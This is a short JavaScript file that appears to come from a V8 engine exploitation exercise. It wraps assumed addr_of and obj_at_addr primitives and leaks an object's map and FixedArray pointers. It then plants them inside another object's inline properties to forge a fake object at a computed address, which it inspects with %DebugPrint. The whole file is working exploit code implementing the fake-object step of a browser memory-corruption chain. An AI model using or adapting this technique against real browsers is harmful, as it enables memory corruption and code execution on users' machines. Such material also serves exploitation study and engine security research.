load('int64.js')

// int64 wrappers for primitives
function read_offset_int64(obj, offset) {
    let data = read_offset(obj, offset);
    return Int64.from_double(data);
}
function addr_of_int64(obj) {
    return Int64.from_double(addr_of(obj));
}
function obj_at_addr_int64(addr) {
    return obj_at_addr(addr.to_double());
}

let real_object = {x:1337, b:1.1}
/*
0xe5bc4c0ba18:  0x000008ef3bd8a5e9  0x00000b6800480c21
0xe5bc4c0ba28:  0x00000b6800480c21  0x0000053900000000
0xe5bc4c0ba38:  0x3ff199999999999a
*/

// Leak the map pointer
let real_object_map = read_offset_int64(real_object, 0);

// This will be used for both elements and properties
let empty_fixedarray = read_offset_int64(real_object, 1);

let holder = {
    a: real_object_map.to_double(), // Map pointer
    b: empty_fixedarray.to_double(), // Properties array
    c: empty_fixedarray.to_double(), // Elements array,
    d: 1234, // Inline property x
    e: 2.2, // Inline property b
}

let fake_pointer = addr_of_int64(holder).add(8*3);
let fake_object = obj_at_addr_int64(fake_pointer);

%DebugPrint(fake_object);
// When you DebugPrint you'll get a valid print that looks the same as the original, but with different properties
